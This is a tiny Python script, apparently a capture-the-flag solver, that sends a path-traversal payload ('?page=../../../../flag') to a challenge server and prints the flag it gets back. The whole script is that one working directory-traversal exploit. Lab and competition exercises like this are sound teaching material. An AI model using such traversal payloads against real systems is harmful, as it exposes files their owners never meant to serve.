import requests
import os

def main():
    response = requests.get(
        f"https://{os.getenv('CTF4B_HOST')}:{os.getenv('CTF4B_PORT')}/?page=../../../../flag",
    )
    print(f"[*] FLAG: {response.text}")

if __name__ == '__main__':
    main()